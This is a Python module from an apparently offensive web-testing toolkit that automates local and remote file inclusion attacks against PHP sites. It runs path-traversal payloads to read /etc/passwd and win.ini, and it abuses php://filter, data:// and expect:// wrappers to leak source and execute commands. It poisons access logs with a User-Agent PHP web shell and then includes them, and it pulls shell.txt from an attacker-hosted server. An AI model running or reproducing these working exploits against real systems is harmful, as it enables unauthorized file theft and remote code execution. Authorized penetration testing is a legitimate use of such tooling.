"""
modules/lfi_rfi.py
tmrswrr - Local/Remote File Inclusion & PHP Wrappers
LFI → RCE via log poisoning, PHP filters, RFI, data:// 
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name):
    d = str(OUTPUT_DIR); os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target():
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL"); SESSION["target_url"] = url
    return url


def lfi_detection():
    section("LOCAL FILE INCLUSION (LFI) DETECTION")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    param = prompt("Parameter to test (e.g. page, file, include, path, lang, doc)")
    if not param:
        param = "page"

    lfi_payloads = [
        # Basic traversal
        ("../../../etc/passwd",                    "Basic LFI"),
        ("....//....//....//etc/passwd",            "Double-dot bypass"),
        ("..%2F..%2F..%2Fetc%2Fpasswd",            "URL-encoded"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","Double URL-encoded"),
        ("..%252F..%252F..%252Fetc%252Fpasswd",     "Double encoding"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd",      "UTF-8 overlong"),
        ("/etc/passwd",                             "Absolute path"),
        ("/etc/passwd%00",                          "Null byte (PHP <5.3)"),
        ("../../../etc/passwd%00.jpg",              "Null byte + extension"),
        ("....//....//etc/passwd",                  "Triple dots"),
        # Windows targets
        ("..\\..\\..\\windows\\win.ini",            "Windows win.ini"),
        ("..%5C..%5C..%5Cwindows%5Cwin.ini",       "Windows URL-encoded"),
        ("/windows/win.ini",                        "Windows absolute"),
        # Interesting files
        ("../../../var/log/apache2/access.log",     "Apache access log"),
        ("../../../var/log/nginx/access.log",       "Nginx access log"),
        ("../../../proc/self/environ",              "Proc environ"),
        ("../../../proc/self/fd/0",                 "Proc FD"),
    ]

    info(f"Testing {len(lfi_payloads)} LFI payloads on ?{param}=...")
    print()
    confirmed = []
    import urllib.parse
    for payload, desc in lfi_payloads:
        enc = urllib.parse.quote(payload, safe="/.")
        test_url = f"{url}?{param}={enc}"
        out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 8')
        if any(x in out for x in ["root:x:", "daemon:", "[extensions]", "[fonts]", "www-data"]):
            success(f"LFI CONFIRMED: {desc}")
            success(f"  Payload: {payload}")
            print(f"  Content: {out[:150]}")
            add_vuln("Local File Inclusion (LFI)", "Critical", "A01:2021",
                     f"File read via {param}={payload}", url)
            confirmed.append((payload, desc))
            break
        elif "[boot loader]" in out.lower() or "for 16-bit app" in out.lower():
            success(f"LFI CONFIRMED (Windows): {desc}")
            confirmed.append((payload, desc))
            break
        else:
            print(f"  {DIM}[-] {desc}{RST}")

    return confirmed


def php_wrappers():
    section("PHP WRAPPERS - Filter / Input / Data")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""
    param = prompt("Vulnerable LFI parameter") or "page"

    import base64
    import urllib.parse

    print(f"""
  {NEON_CYN}PHP Wrappers for LFI exploitation:{RST}
""")
    targets = [
        "index.php", "config.php", "login.php",
        "admin.php", "connect.php", "database.php",
    ]

    wrapper_tests = [
        # Read PHP source via base64 (bypasses PHP execution)
        ("php://filter/convert.base64-encode/resource=index.php",
         "Read index.php source (base64)"),
        ("php://filter/convert.base64-encode/resource=config.php",
         "Read config.php source (base64)"),
        ("php://filter/read=string.rot13/resource=index.php",
         "Read index.php source (ROT13)"),
        ("php://filter/convert.base64-encode/resource=../../../etc/passwd",
         "Read /etc/passwd via filter"),
        # PHP input - POST body execution
        ("php://input",
         "Execute POST body as PHP (needs POST request)"),
        # Data stream - encode+execute
        (f"data://text/plain;base64,{base64.b64encode(b'<?php system($_GET[\"cmd\"]);?>').decode()}",
         "data:// RCE payload"),
        ("data://text/plain,<?php+system('id');?>",
         "data:// simple RCE"),
        # Expect - exec()
        ("expect://id",
         "expect:// wrapper (runs id command)"),
        ("zip://shell.jpg%23shell",
         "zip:// wrapper (requires file upload)"),
    ]

    for payload, desc in wrapper_tests:
        enc = urllib.parse.quote(payload, safe="/:=+#%")
        test_url = f"{url}?{param}={enc}"

        if "php://input" in payload:
            out, _, _ = run_cmd(
                f'curl -sk {cookie_flag} "{test_url}" '
                f'-X POST -d "<?php system(\'id\'); ?>" -m 8'
            )
        else:
            out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 8')

        # Check for base64-encoded source
        if "base64" in payload and len(out) > 20 and re.match(r'^[A-Za-z0-9+/=]{20,}', out.strip()):
            success(f"PHP SOURCE LEAK: {desc}")
            try:
                decoded = base64.b64decode(out.strip() + "==").decode("utf-8", errors="replace")
                print(f"  Decoded ({len(decoded)} chars): {decoded[:200]}")
                out_file = _out(f"php_source_{payload.split('=')[-1]}.php")
                with open(out_file, "w") as f:
                    f.write(decoded)
                success(f"  Source saved → {out_file}")
                add_vuln("PHP Source Code Disclosure via Wrapper", "Critical", "A02:2021",
                         f"Source of {payload.split('=')[-1]} exposed", url)
            except Exception:
                print(f"  Raw output: {out[:200]}")

        elif "uid=" in out or "www-data" in out or "root" in out:
            success(f"PHP WRAPPER RCE: {desc}")
            print(f"  Output: {out[:150]}")
            add_vuln("PHP Wrapper RCE", "Critical", "A03:2021",
                     f"Code execution via {payload[:60]}", url)

        else:
            print(f"  {DIM}[-] {desc}{RST}")


def lfi_to_rce():
    section("LFI → RCE via LOG POISONING")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    print(f"""
  {NEON_CYN}Log Poisoning Attack Chain:{RST}
    1. Inject PHP payload into a log file via User-Agent or URL path
    2. Include that log file via LFI
    3. PHP executes the injected code → RCE

  {NEON_GRN}Step 1: Inject into Apache/Nginx access log via User-Agent:{RST}
""")
    param = prompt("Vulnerable LFI parameter") or "page"
    php_payload = "<?php system($_GET['cmd']); ?>"
    import urllib.parse

    # Inject PHP into User-Agent → gets logged
    info("Injecting PHP payload into web server access log...")
    run_cmd(
        f'curl -sk -H "User-Agent: {php_payload}" {cookie_flag} {url} -m 5 -o /dev/null'
    )
    success("Payload injected into User-Agent (logged)")

    # Also try injecting via invalid URL path
    run_cmd(f'curl -sk {cookie_flag} "{url}/{php_payload}" -m 5 -o /dev/null')

    log_paths = [
        "../../../var/log/apache2/access.log",
        "../../../var/log/apache2/error.log",
        "../../../var/log/nginx/access.log",
        "../../../var/log/nginx/error.log",
        "../../../var/log/httpd/access_log",
        "../../../proc/self/fd/2",
        "../../../proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
    ]

    print(f"\n  {NEON_CYN}Step 2: Include log file via LFI to trigger execution:{RST}")
    for log in log_paths:
        enc = urllib.parse.quote(log, safe="/.")
        test_url = f"{url}?{param}={enc}&cmd=id"
        out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 8')
        if "uid=" in out or "www-data" in out:
            success(f"LOG POISONING RCE CONFIRMED via: {log}")
            print(f"  Output: {out[:200]}")
            add_vuln("LFI → Log Poisoning RCE", "Critical", "A03:2021",
                     f"RCE via log inclusion: {log}", url)
            break
        elif "<?php" in out:
            warn(f"PHP not executed in log - check PHP version/config: {log}")
        else:
            print(f"  {DIM}[-] {log}{RST}")

    print(f"""
  {NEON_CYN}Other LFI→RCE via file upload + include:{RST}
    1. Upload image file with PHP in EXIF/comment
    2. Include uploaded file via LFI
    3. PHP executes from image → RCE

  {NEON_CYN}LFI→RCE via /proc/self/environ:{RST}
    curl -sk -H "User-Agent: <?php system('id'); ?>" {url}
    curl -sk "{url}?{param}=../../../proc/self/environ&cmd=id"

  {NEON_CYN}LFI→RCE via PHP session file:{RST}
    Set PHPSESSID=<?php system($_GET['cmd']); ?>
    Include /var/lib/php/sessions/sess_PHPSESSID
""")


def rfi_test():
    section("REMOTE FILE INCLUSION (RFI)")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""
    param = prompt("Vulnerable LFI parameter") or "page"

    attacker_url = SESSION.get("_oob_url", "")
    if not attacker_url:
        attacker_url = prompt("Your HTTP server URL (e.g. http://192.168.1.x:8877)")

    if not attacker_url:
        warn("RFI requires an attacker-controlled HTTP server")
        print(f"""
  {NEON_CYN}Setup local server:{RST}
    python3 -m http.server 8080   # in /tmp
    # Create shell.txt containing: <?php system($_GET['cmd']); ?>
  {NEON_CYN}Or use YeepForge OOB Server:{RST}
    Main menu → [O] OOB Callback Server → [1] Start Server
""")
        return

    import urllib.parse

    rfi_payloads = [
        f"{attacker_url}/shell.txt",
        f"{attacker_url}/shell.php",
        f"http://{attacker_url.split('://')[-1]}/shell",
        f"//{attacker_url.split('://')[-1]}/shell.txt",
    ]

    info(f"Testing RFI - server: {attacker_url}")
    for payload in rfi_payloads:
        enc = urllib.parse.quote(payload, safe="/:")
        test_url = f"{url}?{param}={enc}&cmd=id"
        out, _, _ = run_cmd(f'curl -sk {cookie_flag} "{test_url}" -m 10')
        if "uid=" in out:
            success(f"RFI RCE CONFIRMED: {payload}")
            add_vuln("Remote File Inclusion (RFI) RCE", "Critical", "A03:2021",
                     f"RFI from {payload}", url)
        else:
            print(f"  {DIM}[-] {payload}{RST}")


def run():
    print_banner("LFI / RFI / PHP WRAPPERS",
                 "tmrswrr - Local/Remote File Inclusion · Log Poisoning · PHP Filters")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} LFI Detection          {SOFT_WHITE}(18 traversal payloads · Windows + Linux){RST}
  {NEON_CYN}[2]{RST} PHP Wrappers           {SOFT_WHITE}(php://filter · data:// · expect:// · source read){RST}
  {NEON_CYN}[3]{RST} LFI → RCE (Log Poison) {SOFT_WHITE}(UA injection → log include → code exec){RST}
  {NEON_CYN}[4]{RST} Remote File Inclusion  {SOFT_WHITE}(RFI to include attacker-hosted PHP){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0": break
        elif c == "1": lfi_detection()
        elif c == "2": php_wrappers()
        elif c == "3": lfi_to_rce()
        elif c == "4": rfi_test()
        save_session()
